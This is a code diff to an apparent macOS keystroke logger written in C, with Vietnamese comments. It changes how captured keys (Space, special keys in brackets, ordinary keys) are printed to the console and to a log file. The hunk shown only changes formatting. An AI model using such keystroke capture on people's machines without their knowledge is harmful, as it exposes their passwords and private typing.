@@ -86,28 +86,48 @@ void on_keyboard_event(CGEventRef event, const char* keyString) {
         hasContentFile = 0;
     }
     
-    // Kiểm tra xem có phải là phím chức năng không
-    int isFunctionKey = is_function_key(keyString);
+    // Kiểm tra xem có phải là Space không
+    int isSpace = (strcmp(keyString, "Space") == 0);
     
-    // Thêm khoảng cách trước phím chức năng nếu đã có nội dung trước đó
-    if (isFunctionKey && hasContent) {
-        printf(" ");
-        fflush(stdout);
-    }
-    if (isFunctionKey && hasContentFile && g_logFile) {
-        fprintf(g_logFile, " ");
-    }
+    // Kiểm tra xem có phải là phím đặc biệt (cần đưa vào []) không
+    int isSpecialKey = is_function_key(keyString) && !isSpace;
     
     // In phím
-    printf("%s", keyString);
-    hasContent = 1;
-    fflush(stdout);
-    
-    if (g_logFile) {
-        fprintf(g_logFile, "%s", keyString);
-        hasContentFile = 1;
-        fflush(g_logFile);
+    if (isSpace) {
+        // Space: in dấu cách trực tiếp (không cần khoảng cách trước vì Space chính là khoảng cách)
+        printf(" ");
+        fflush(stdout);
+        if (g_logFile) {
+            fprintf(g_logFile, " ");
+            fflush(g_logFile);
+        }
+    } else if (isSpecialKey) {
+        // Phím đặc biệt: thêm khoảng cách trước và đưa vào []
+        if (hasContent) {
+            printf(" ");
+            fflush(stdout);
+        }
+        if (hasContentFile && g_logFile) {
+            fprintf(g_logFile, " ");
+        }
+        printf("[%s]", keyString);
+        fflush(stdout);
+        if (g_logFile) {
+            fprintf(g_logFile, "[%s]", keyString);
+            fflush(g_logFile);
+        }
+    } else {
+        // Phím thường: in trực tiếp
+        printf("%s", keyString);
+        fflush(stdout);
+        if (g_logFile) {
+            fprintf(g_logFile, "%s", keyString);
+            fflush(g_logFile);
+        }
     }
+    
+    hasContent = 1;
+    hasContentFile = 1;
 }
 
 // Callback khi cửa sổ active thay đổi
